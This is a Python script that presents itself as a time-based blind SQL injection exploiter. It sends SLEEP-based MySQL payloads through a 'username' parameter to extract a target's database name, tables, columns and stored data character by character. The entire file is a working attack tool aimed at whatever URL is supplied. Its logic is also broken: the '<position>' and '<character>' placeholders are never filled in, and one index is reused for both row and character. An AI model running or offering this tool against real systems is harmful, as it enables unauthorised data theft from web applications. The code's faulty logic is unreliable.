import requests
import time
import string
import argparse

def send_request(url, method, data, delay):
    """
    Sends the HTTP request and measures the response time.
    """
    start_time = time.time()
    response = None
    try:
        if method.upper() == "POST":
            response = requests.post(url, data=data)
        elif method.upper() == "GET":
            response = requests.get(url, params=data)
        else:
            raise ValueError("Unsupported HTTP method. Use 'GET' or 'POST'.")
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        return False
    elapsed_time = time.time() - start_time
    return elapsed_time >= delay

def get_length(url, method, payload_template, delay):
    """
    Determines the length of the target data (e.g., database name).
    """
    print("[*] Determining length of data...")
    for length in range(1, 101):  # Adjust the range as needed
        payload = payload_template.replace("*", f"LENGTH(DATABASE())={length}")
        if send_request(url, method, {"username": payload}, delay):
            print(f"[+] Data length: {length}")
            return length
    print("[-] Failed to determine length.")
    return 0

def extract_data(url, method, payload_template, delay, length):
    """
    Extracts data character by character.
    """
    print("[*] Extracting data...")
    valid_chars = string.ascii_letters + string.digits + string.punctuation + " "
    extracted_data = ""

    for position in range(1, length + 1):
        for char in valid_chars:
            payload = payload_template.replace("*", f"SUBSTRING(DATABASE(),{position},1)='{char}'")
            if send_request(url, method, {"username": payload}, delay):
                extracted_data += char
                print(f"[+] Found character at position {position}: {char}")
                break
        else:
            print("[-] Failed to extract character. Exiting.")
            break
    print(f"[+] Extracted Data: {extracted_data}")
    return extracted_data

def main():
    parser = argparse.ArgumentParser(description="Time-based Blind SQL Injection Exploiter")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-m", "--method", required=True, choices=["GET", "POST"], help="HTTP method")
    parser.add_argument("-p", "--payload", required=True, help="Path to payload template file")
    parser.add_argument("-d", "--delay", required=True, type=int, help="Time delay in seconds")
    parser.add_argument("-M", "--mode", required=True, choices=["database", "tables", "columns", "data"], help="Enumeration mode")
    parser.add_argument("-t", "--table", help="Table name (required for columns and data modes)")
    parser.add_argument("-c", "--column", help="Column name (required for data mode)")
    
    args = parser.parse_args()

    # Load payload template
    with open(args.payload, "r") as file:
        payload_template = file.read().strip()
    
    if args.mode == "database":
        # Determine database name length
        length_template = payload_template.replace("*", f"IF(LENGTH(DATABASE())=<position>, SLEEP({args.delay}), 0)")
        data_length = get_length(args.url, args.method, length_template, args.delay)
        
        # Extract database name
        if data_length > 0:
            extract_template = payload_template.replace("*", f"IF(SUBSTRING(DATABASE(),<position>,1)='<character>', SLEEP({args.delay}), 0)")
            extract_data(args.url, args.method, extract_template, args.delay, data_length)
    
    elif args.mode == "tables":
        tables_template = payload_template.replace("*", f"IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT <position>,1),<position>,1)='<character>', SLEEP({args.delay}), 0)")
        extract_data(args.url, args.method, tables_template, args.delay, 50)  # Adjust maximum table length as needed

    elif args.mode == "columns":
        if not args.table:
            print("[-] Table name is required for columns mode.")
            return
        
        columns_template = payload_template.replace("*", f"IF(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{args.table}' LIMIT <position>,1),<position>,1)='<character>', SLEEP({args.delay}), 0)")
        extract_data(args.url, args.method, columns_template, args.delay, 50)  # Adjust maximum column length as needed

    elif args.mode == "data":
        if not args.table or not args.column:
            print("[-] Table and column names are required for data mode.")
            return
        
        data_template = payload_template.replace("*", f"IF(SUBSTRING((SELECT {args.column} FROM {args.table} LIMIT <position>,1),<position>,1)='<character>', SLEEP({args.delay}), 0)")
        extract_data(args.url, args.method, data_template, args.delay, 50)  # Adjust maximum data length as needed

if __name__ == "__main__":
    main()
